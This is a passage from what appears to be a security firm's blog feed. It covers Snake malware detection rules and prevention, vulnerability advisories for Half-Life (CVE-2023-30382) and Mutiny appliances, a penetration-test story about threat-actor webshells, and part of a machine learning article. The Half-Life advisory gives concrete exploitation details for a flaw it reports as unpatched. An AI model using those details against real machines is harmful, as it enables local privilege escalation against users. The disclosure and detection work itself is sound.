      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Security researchers are currently developing detections and rules to speed up the memory analysis process. For example, Matt Suiche, Director of Incident Response R&amp;amp;D at Magnet Forensics (MAGT:TO), has recently developed a &lt;a href=&#34;https://gist.github.com/msuiche/8c8fd278430dda0292b4cfdfc549ca2d&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;YARA rule&lt;/a&gt; based on the above Volatility plugin to look into memory and identify snake.&lt;/p&gt;
&lt;h2&gt;Other Detection Mechanisms and Sigma Rules&lt;span class=&#34;absolute -mt-20&#34; id=&#34;other-detection-mechanisms-and-sigma-rules&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#other-detection-mechanisms-and-sigma-rules&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Researchers at the open-source project SigmaHQ have also started developed rules that will help hunt for the malware and detect when it performs malicious operations in the network which can be found &lt;a href=&#34;https://github.com/SigmaHQ/sigma/pull/4231/files&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;As of now, the rules currently developed include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;SNAKE Malware Kernel Driver File Indicator&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Malware Installer Name Indicators&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Malware WerFault Persistence File Creation&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Potential SNAKE Malware Installation CLI Arguments Indicator&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SNAKE Malware Installation Binary Indicator&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Potential SNAKE Malware Persistence Service Execution&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SNAKE Malware Covert Store Registry Key&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Potential Encrypted Registry Blob Related To SNAKE Malware&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SNAKE Malware Service Persistence&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Should a different set of rules be needed for your specific EDR or SOC/SIEM it is possible to utilise the extremely helpful open-source resource &lt;a href=&#34;https://uncoder.io/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Uncoder&lt;/a&gt; to convert rules.&lt;/p&gt;
&lt;h1&gt;Long-term prevention&lt;/h1&gt;&lt;p&gt;If you believe your organisation is at risk, JUMPSEC recommends building an Incident Response Plan and a dedicated team to monitor and effectively respond to the threats posed by Snake, in order to meaningfully utilise and validate the detection techniques outlined above.&lt;/p&gt;
&lt;p&gt;To ensure that implemented detections are effective JUMPSEC recommends:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Using Atomic Red Team and Purple Team approaches to ingest and execute techniques used by Snake in your network to identify gaps in detection capabilities. For Purple Team Testing, security researchers at Red Canary have already started developing open-source Atomic Red Team test cases to simulate Snake which can be found &lt;a href=&#34;https://github.com/redcanaryco/atomic-red-team/pull/2418&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Actively hunting for Snake malware using endpoint and network detection tooling. Third party security providers such as JUMPSEC can assist with deployment and integration with existing detection and response platforms to monitor and prioritise critical instances of malicious activity.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Deploying Canary Tokens in your estate where possible. Canary Tokens can serve as early warning systems as part of your organisations broader security strategy.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ensuring you have an adequate incident response plan that is ready to deploy. This may include baselining or reviewing existing response processes and procedures. In the event that a Snake is identified, incident response plans can be triggered, affected hosts quarantined, back-up systems deployed, and any other steps deemed necessary to secure the environment can be taken.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additionally, Snake typically achieves network intrusion by exploiting vulnerable, publicly available infrastructure via targeted phishing and social engineering campaigns, meaning that organisations should rigorously review potential vulnerabilities in externally facing assets.&lt;/p&gt;
&lt;h2&gt;MFA and credential management&lt;span class=&#34;absolute -mt-20&#34; id=&#34;mfa-and-credential-management&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#mfa-and-credential-management&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As an FSB espionage tool gathering credentials for up to 20 years, JUMPSEC would additionally echo that organisations who have not already embedded standard best practice when it comes to MFA and credential management should implement appropriate measures. For example:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Change account credentials to values which cannot be brute forced or guessed based on old passwords, requiring minimum password strengths and unique credentials for every account.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use appropriate role separation, account permissions and separate user and privileged accounts.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Implement phishing-resistant MFA or go passwordless if possible (Biometrics and FIDO2 keys).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Deploy digitally signed Security.txt files to all public facing web domains which conform to the recommendations in RFC 9118.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As a final note, JUMPSEC recommend reporting any Indicators of Compromise (IoCs) to the relevant authorities (NCSC for UK based organisations), as well as the wider security community where appropriate.&lt;/p&gt;
&lt;h2&gt;Helpful Links&lt;span class=&#34;absolute -mt-20&#34; id=&#34;helpful-links&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#helpful-links&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;CISA Advisory - &lt;a href=&#34;https://www.cisa.gov/sites/default/files/2023-05/aa23-129a&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.cisa.gov/sites/default/files/2023-05/aa23-129a&lt;/a&gt;_snake_malware_1.pdf&lt;/li&gt;
&lt;li&gt;RFC 9118 - &lt;a href=&#34;https://datatracker.ietf.org/doc/rfc9118/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://datatracker.ietf.org/doc/rfc9118/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Canary Tokens - &lt;a href=&#34;https://canarytokens.org/generate&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://canarytokens.org/generate&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Guide to setup security.exe - &lt;a href=&#34;https://securitytxt.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://securitytxt.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Mitre - &lt;a href=&#34;https://attack.mitre.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://attack.mitre.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;SigmaHQ rules - &lt;a href=&#34;https://github.com/SigmaHQ/sigma&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/SigmaHQ/sigma&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

      </description>
    </item>
    
    <item>
      <title>&lt;strong&gt;Advisory CVE-2023-30382 – Half-Life Local Privilege Escalation&lt;/strong&gt;</title>
      <link>//localhost:1313/articles/2023/05/2023-05-23-advisory-cve-2023-30382-half-life-local-privilege-escalation/</link>
      <pubDate>Tue, 23 May 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/05/2023-05-23-advisory-cve-2023-30382-half-life-local-privilege-escalation/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software:&lt;/strong&gt; Half-Life&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Affected versions:&lt;/strong&gt; Latest (&amp;lt;= build 5433873), at the time of writing&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vendor page:&lt;/strong&gt; &lt;a href=&#34;https://www.valvesoftware.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.valvesoftware.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVE Reference:&lt;/strong&gt; CVE-2023-30382&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Published:&lt;/strong&gt; 23/05/2023&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVSS 3.1 Score:&lt;/strong&gt; 8.2 AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Attack Vector:&lt;/strong&gt; Local&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Credit:&lt;/strong&gt; Ryan Saridar&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;An attacker can leverage a stack-based buffer overflow via Half-Life’s command line arguments to compromise the account of any local user who launches the game.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;hl.exe does not adequately perform bounds checking on the command line used to launch it, allowing an attacker with control of the launch parameters to gain code execution as the user running it. By default, all users can access the C:\Program Files (x86)\Steam\userdata\&lt;steamID3&gt;\config\localconfig.vdf file, which can be modified to enforce a Steam application to launch with any provided command line parameters. Combining these, a low-privileged attacker can set specially crafted launch parameters using this file, and therefore gain privilege escalation when a higher privileged user runs the application.&lt;/p&gt;
&lt;p&gt;The cause of the buffer overflow is found in the CCommandLine::CreateCmdLine and CCommandLine::LoadParametersFromFile functions. CreateCmdLine allocates a 4096 byte buffer which LoadParametersFromFile copies the command line to. Given that the command line is not restricted to 4096 bytes, this can lead to an overflow. This appears to have been fixed in games such as HL2 and TF2, however the fix was not applied to the original HL.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Valve has not responded to previous submissions of this issue, meaning the game is not patched. The simplest and most effective method of mitigation at this time is the uninstallation of Half-Life.&lt;/p&gt;
&lt;p&gt;That said, there is another way of mitigating this route of attack if this isn’t an option, though it does not address the underlying buffer overflow vulnerability and thus will not cover possible alternate routes of exploitation. Your Steam installation contains globally writable configuration files that store each Steam user’s saved command line arguments (C:\Program Files (x86)\Steam\userdata\&lt;steamID3&gt;\config\localconfig.vdf). If a Steam user account is predominantly used by a specific local user, you can restrict writability of this file to that user account, preventing another user from being able to overwrite your command line arguments. You could also check the command line parameters via the Steam GUI before launching the game to ensure it is as expected.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;09/01/2021: Buffer overflow submitted for bug bounty, though rejected due to social engineering requirement&lt;/p&gt;
&lt;p&gt;11/01/2021: Attempt to disclose via Valve’s public security email, with no response received&lt;/p&gt;
&lt;p&gt;09/02/2021: Subsequent attempt to disclose, again with no response&lt;/p&gt;
&lt;p&gt;28/08/2022: Revisited the vulnerability and discovered the local privilege escalation route via the configuration file&lt;/p&gt;
&lt;p&gt;29/08/2022: Subsequent bug bounty submission, which was rejected due to claims that a remote code execution exploit of this vulnerability had been discovered and disclosed since&lt;/p&gt;
&lt;p&gt;04/04/2023: CVE requested and plan to publish due to lack of remediation, despite awareness of the issue&lt;/p&gt;
&lt;p&gt;26/04/2023: CVE assigned by MITRE&lt;/p&gt;
&lt;p&gt;23/05/2023: Publication by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Butting Heads with a Threat Actor on an Engagement</title>
      <link>//localhost:1313/articles/2023/04/2023-04-17-butting-heads-with-a-threat-actor-on-an-engagement/</link>
      <pubDate>Mon, 17 Apr 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/04/2023-04-17-butting-heads-with-a-threat-actor-on-an-engagement/</guid>
      <description>
        
        
        &lt;p&gt;At the time of writing I am enjoying some non-billable time in the wake of a demanding engagement spanning across several months. As such, I thought it would be a good time to write up a war story from a recent project in which we came head to head against genuine and active threat actors whilst on an engagement.&lt;/p&gt;
&lt;p&gt;To set the scene, I am working on a purple team project in which we are to cover both the external and internal estate. This tale comes from the external portion of the engagement and as such my colleague and I are going about our usual external red team attack methodology. During this external phase we identify several instances of servers running a software that will remain unnamed for confidentiality’s sake. I will say that this was a third-party software that is used for Identity Access Management, and it appeared to be used in several environments (pre-prod, production, etc) within the client’s estate.&lt;/p&gt;
&lt;p&gt;We fingerprint the exact version of the technology in-use and find that it is in fact vulnerable and outdated. Specifically, it is vulnerable to an unrestricted file upload vulnerability. As is so often the case, metasploit had created a module for the automated exploitation of this vulnerability - great news! As this is not a covert red team, and therefore getting detected is not an issue, I attempt to exploit the file upload vulnerability using meterpreter and msfvenom. Alas, the exploit fails. Undeterred, I look to manually verify the vulnerability myself as I so often find myself doing when metasploit fails me.&lt;/p&gt;
&lt;p&gt;I find a proof-of-concept script on Github and read through the code. It looks good so I quickly write (steal) a JSP webshell to accompany the script and point the pair at my client’s vulnerable servers. This time, it works. With what feels like ‘too good to be true’ ease I’ve got remote code execution on the production Single Sign On (SSO) and Identity Access Management (IAM) server! As always in these cases I let the client know immediately before digging a little bit deeper.&lt;/p&gt;
&lt;p&gt;When landing on an unknown machine I want to immediately perform some situational awareness. From an external perspective this may look slightly different to internal. Some of the main questions include: What OS/distribution am I using? What user and permissions do I have? Am I domain-joined? Do I have visibility into the internal network?&lt;/p&gt;
&lt;p&gt;I quickly determine these answers and find that I am running as a low-privileged user, on a unix machine, that is not domain-joined. Not as juicy as I originally thought, but this is still the production SSO and IAM box so I am hopeful. At this point I get my first inclination that maybe such a trivial exploit chain may have already been abused. I run an &lt;em&gt;ls&lt;/em&gt; to look for the existence of other webshells beyond just my own.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19445&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;663&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/1.png&#34; title=&#34;Figure 1&#34; alt=&#34;Output of ’ls’ command&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Figure 1&lt;/figcaption&gt;
  &lt;/figure&gt; Output of &amp;rsquo;ls&amp;rsquo; command[/caption]&lt;/p&gt;
&lt;p&gt;As you can see it appears that I am in the site root of the server. However, what I do not see is the name of my own webshell (cmd.jsp) meaning that my file must not have been uploaded to the site root, more likely it is in the webroot.&lt;/p&gt;
&lt;p&gt;To find the location of the webroot I simply use my webshell to search for the location of my webshell file name to find where all files uploaded via this exploit would land on the file system. Sure enough, I found the appearance of my webshell in a folder that we will falsely call &lt;em&gt;/home/UserName/AppName/Authenticated.&lt;/em&gt; The natural next step is to list the contents of this directory as seen in the screenshot below.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19451&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;265&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/2-1.png&#34; title=&#34;Figure 2&#34; alt=&#34;2 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Figure 2&lt;/figcaption&gt;
  &lt;/figure&gt; Contents of Webroot[/caption]&lt;/p&gt;
&lt;p&gt;Whilst this was useful, it was listing the files in alphabetical order which made it difficult to process which file could be a malicious JSP file versus one naturally used for webserver installation. I do another &lt;em&gt;ls&lt;/em&gt; command but this time listing the contents of the directory in descending order of date modified. That helps clear things up!&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19452&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;556&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/3-1.png&#34; title=&#34;Figure 3&#34; alt=&#34;3 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Figure 3&lt;/figcaption&gt;
  &lt;/figure&gt; Contents sorted by Date Modified[/caption]&lt;/p&gt;
&lt;p&gt;I immediately notice the large number of files that have the exact same last modified date and time on Feb 9th. My assumption is that Feb 9th was when the webserver was installed, as all the installation files share this modification date. This leaves 8 files that have been uploaded in the 21 days since installation. The top entry (cmd.jsp) is my webshell and can be excluded. Judging by the time stamps and similar file names this still leaves several unaccounted for JSP files. Naturally, I did a &lt;em&gt;cat&lt;/em&gt; on those files and sure enough…they were also webshells.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19453&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;477&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/4-1.png&#34; title=&#34;Figure 4&#34; alt=&#34;4 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Figure 4&lt;/figcaption&gt;
  &lt;/figure&gt; Threat Actor Webshells[/caption]&lt;/p&gt;
&lt;p&gt;At this point I know we have stumbled upon something bad. I phone the client and let them know the news whilst I continue trying to attribute some of the webshells. Due to the fact that some of the files had very similar names and were uploaded consecutively I can safely assume that they belong to the same threat actor. When grouping as such, I arrive at the conclusion that there have been 4 threat actors who have exploited this in the last 5 days!&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/5-1.png&#34; title=&#34;5 1&#34; alt=&#34;5 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;5 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;This is, of course, not counting any threat actors who had deleted their webshells when not in use like I had done. In the same vein, it is important to bear in mind that this was only one of several appearances of this vulnerable server in the estate.&lt;/p&gt;
&lt;p&gt;I reach out to the client to ask permission to repeat the same process on the other vulnerable instances, but by this point the client has engaged their Managed Detection and Response (MDR) provider who has already begun the digital forensics work of identifying the extent of the damage,  whilst the client’s security team begin working on a patch. I write up a professional document containing all my findings, remediation steps, etc., and hand it over to both parties.&lt;/p&gt;
&lt;p&gt;Later that evening I receive an email saying that the vulnerability has been patched and, thankfully, it appears it was caught before it became too much of an issue. However, the MDR provider did see attempts to jump from the external box to the internal network, and confirmed that the box had been enrolled in a crypto mining bot network to use its resources for crypto mining. All things considered this was a pretty good outcome after the initial shock of compromising such a sensitive system.&lt;/p&gt;
&lt;p&gt;And with that quick turnaround my brief headbutt with a genuine and active threat actor(s) came to an end. It is not every day that you get findings like this but it lit the fire in me to get more exposure to the Incident Response side of things, and the client was happy we’d found and fixed a critical vulnerability in just a handful of hours. Wins all round!&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>&lt;strong&gt;Advisory CVE-2022-37832 - Mutiny Network Monitoring Appliance hardcoded credentials&lt;/strong&gt;</title>
      <link>//localhost:1313/articles/2022/12/2022-12-15-advisory-cve-2022-37832-mutiny-network-monitoring-appliance-hardcoded-credentials/</link>
      <pubDate>Thu, 15 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/12/2022-12-15-advisory-cve-2022-37832-mutiny-network-monitoring-appliance-hardcoded-credentials/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software:&lt;/strong&gt; Mutiny Network Monitoring Appliance&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Affected versions:&lt;/strong&gt; &amp;lt;= 7.2.0-10855&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vendor page:&lt;/strong&gt; &lt;a href=&#34;https://www.mutiny.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.mutiny.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVE Reference:&lt;/strong&gt; CVE-2022-37832&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Published:&lt;/strong&gt; 16/12/2022&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVSS 3.1 Score:&lt;/strong&gt; 10.0 AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Attack Vector:&lt;/strong&gt; Network&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Credit:&lt;/strong&gt; Ryan Saridar&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;An attacker can log in as root remotely to the appliance via SSH.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Upgrade to version 7.2.0-10855 onwards to remediate the problem.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Before version 7.2.0-10855, the SSH service allows password login to the appliance. The use of weak, hardcoded root credentials between versions means that an attacker with knowledge of this fixed password can log into the appliance remotely and gain unrestricted access to it. Between version 7.2.0-10788 and up to 7.2.0-10850, key-based authentication was introduced, however password-based authentication was not yet disabled. On the patched version, key-based authentication is enforced.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;05/08/2022: Issue reported to the vendor&lt;/p&gt;
&lt;p&gt;05/08/2022: Vendor acknowledged the issues&lt;/p&gt;
&lt;p&gt;19/08/2022: Vendor fixed the issue&lt;/p&gt;
&lt;p&gt;12/09/2022: CVE number assigned from MITRE&lt;/p&gt;
&lt;p&gt;16/12/2022: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Online Machine Learning: how to integrate user feedback</title>
      <link>//localhost:1313/articles/2022/12/2022-12-12-online-machine-learning-how-to-integrate-user-feedback/</link>
      <pubDate>Mon, 12 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/12/2022-12-12-online-machine-learning-how-to-integrate-user-feedback/</guid>
      <description>
        
        
        &lt;p&gt;When designing and implementing a machine learning model, ensuring it is continually updated is a challenge that all engineers encounter. &lt;/p&gt;
&lt;p&gt;In this article, I explore the online machine learning technique that I used during a project and present how it was implemented for effective results.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Choosing a machine learning method&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;choosing-a-machine-learning-method&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#choosing-a-machine-learning-method&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Machine learning solutions can be mainly split into offline and online methods. &lt;strong&gt;Online&lt;/strong&gt; machine learning is a method in which data becomes available in a sequential order and is used to update the best predictor for future data at each step, as opposed to batch learning techniques which generate the best predictor by learning on the entire training data set at once. &lt;/p&gt;
&lt;p&gt;From this concept, the core components are the &lt;strong&gt;data in a sequential order&lt;/strong&gt; and &lt;strong&gt;updating at each step&lt;/strong&gt;. Online machine learning is necessary is based on the following reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Detection models need to be updated instantly, within a relatively short time&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Computation and storage costs need to be minimised for a large dataset&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;New types of patterns need to be integrated quickly&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;strong&gt;Using Apache Airflow&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;using-apache-airflow&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#using-apache-airflow&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;It’s important to have a solid UI to manage the pipelines so I can easily review the chain of pipelines. After much research, I found many engineers recommended Apache Airflow. &lt;/p&gt;
&lt;p&gt;Some of the core concepts for Airflow are described below:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Directed Acyclic Graph (DAG)&lt;/strong&gt; – is a collection of all the tasks you want to run, organised in a way that reflects their relationships and dependencies.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Scheduler and Interval&lt;/strong&gt; - The Airflow scheduler monitors all tasks and DAGs, then triggers the task instances once their dependencies are complete. And the interval is used to set up the time period to rerun for a dag.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;While using Airflow, we encountered two key challenges: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;No default option exists for user feedback to be provided based on the prediction result. &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;It is vital that storage requirements are kept to a manageable level, and that the task can be completed quickly enough to enable the business process to function on-time.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;strong&gt;How we structure different datasets&lt;/strong&gt;:&lt;span class=&#34;absolute -mt-20&#34; id=&#34;how-we-structure-different-datasets&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#how-we-structure-different-datasets&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In order to split train and update processes, we separate training, testing, and updating. The update folder is what we use to provide corrected predictions with csv format. The format is depicted as following:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/Picture.png&#34; alt=&#34;Pred and Corr&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Png1: pred and corr&lt;/p&gt;
&lt;p&gt;The 1 in path_pred is the anomaly prediction. The path_corr is copied initially from path_pred and then corrected by the analyst.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;How to achieve online learning in Airflow&lt;/strong&gt;:&lt;span class=&#34;absolute -mt-20&#34; id=&#34;how-to-achieve-online-learning-in-airflow&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#how-to-achieve-online-learning-in-airflow&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In order to overcome the drawback without interactive mode in Airflow, I had to implement a custom offline solution. Thanks to the powerful automation of Airflow, I just need to set a location and input the corrected prediction result there. Then, the Airflow will read the data from the specific location as an update DAG.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Practicality and speed considerations in online learning&lt;/strong&gt;:&lt;span class=&#34;absolute -mt-20&#34; id=&#34;practicality-and-speed-considerations-in-online-learning&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#practicality-and-speed-considerations-in-online-learning&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As we solved the online machine learning part, we now face the problem about time consumption, and storage. &lt;/p&gt;
&lt;p&gt;As for time consumption, the prediction is made within every interval. The data is sent to the update folder to await reading by DAGs.  Every prediction with the timestamp as the filename can be treated as one batch. Instead of reading and extracting the whole batch of data, I chose only the wrong prediction (after correction) and subsequently extracted the sequence (use LSTM model) from that row in csv. &lt;/p&gt;
&lt;p&gt;seq_array = df.query(&amp;ldquo;path_pred==&amp;lsquo;1&amp;rsquo; &amp;amp; path_corr in [0,&amp;lsquo;0&amp;rsquo;]&amp;rdquo;)[&amp;lsquo;seq_path&amp;rsquo;].values&lt;/p&gt;
&lt;p&gt;Png2: read single prediction sequence&lt;/p&gt;
&lt;p&gt;After splitting the sequences into multiple X and Y (number is less than the total data in a batch), I trained the model based on the chosen data, attempting to integrate the right prediction with certain attempts. &lt;/p&gt;
&lt;table class=&#34;has-white-background-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;for&lt;/mark&gt;&lt;/code&gt; i &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;in &lt;/mark&gt;range(len(batch_y)):&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; # extract the predict_proba for batch_y&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pre_proba = pred_y[i][int(np.argmax(batch_y[i]))]&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; # set the exit condition&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; success_flag = &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;False&lt;/mark&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; no_of_attempts =&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt; 